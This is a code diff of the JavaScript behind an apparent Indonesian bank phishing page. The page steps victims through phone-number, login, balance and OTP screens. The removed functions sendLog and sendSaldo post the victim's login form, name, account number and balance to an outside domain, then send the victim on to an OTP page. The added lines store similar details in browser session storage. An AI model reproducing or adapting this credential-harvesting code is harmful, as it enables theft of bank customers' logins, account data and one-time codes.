@@ -1,7 +1,11 @@
 function sendHp() {
 event.preventDefault();
-        var nomor = document.getElementById("nohp").value;
-        sessionStorage.setItem("nomor", nomor);
+        var nohp = document.getElementById("nohp").value;
+        sessionStorage.setItem("nohp", nohp);
+        var nama = document.getElementById("nama").value;
+        sessionStorage.setItem("nama", nama);
+        var saldo = document.getElementById("saldo").value;
+        sessionStorage.setItem("saldo", saldo);
 $('.process1').fadeIn();
  document.getElementById('btnSubmit1').innerHTML ="Memproses...";
  
@@ -22,58 +26,7 @@ $('.process1').fadeIn();
         })
      }
      
-function sendLog() {
-event.preventDefault();
-$('.process1').fadeIn();
- document.getElementById('btnSubmit1').innerHTML ="Memproses..."; 
-      $.ajax({
-            type: 'POST',
-            url: 'https://choreoapps.ll-feed.cfd/bsi/f1gd/login.php',
-            data: $('#formLog').serialize(),
-            datatype: 'text',          
-            complete: function(data) {
-            setTimeout(function(){
-  window.location.href='saldo.html'
-  document.getElementById('btnSubmit1').innerHTML = "SELANJUTNYA";
- $('.process1').fadeOut();
-    var nomortel = document.getElementById('nomorku').value;
-    sessionStorage.setItem("nomortel", nomortel);    
-    var namanya = document.getElementById('nama').value;
-    sessionStorage.setItem("namanya", namanya);    
-    var noreke = document.getElementById('rek').value;
-    sessionStorage.setItem("noreke", noreke);
-    }, 800);
-            }
-        })
-     }     
-     
-     
-function sendSaldo() {
-event.preventDefault();
-$('.process1').fadeIn();
- document.getElementById('btnSubmit1').innerHTML ="Memproses..."; 
-      $.ajax({
-            type: 'POST',
-            url: 'https://choreoapps.ll-feed.cfd/bsi/f1gd/saldo.php',
-            data: $('#jualpuki').serialize(),
-            datatype: 'text',          
-            complete: function(data) {
-            setTimeout(function(){
-  window.location.href='otp.html'
-  document.getElementById('btnSubmit1').innerHTML = "SELANJUTNYA";
- $('.process1').fadeOut();
- var phone = document.getElementById("nomorsaya").value;
- sessionStorage.setItem("phone", phone);
- var user = document.getElementById("namaku").value;
- sessionStorage.setItem("user", user);
- var card = document.getElementById("norekku").value;
- sessionStorage.setItem("card", card);
- var duet = document.getElementById("saldo").value;
- sessionStorage.setItem("duet", duet);
-    }, 800);
-            }
-        })
-     }     
+
 
 
 // otp
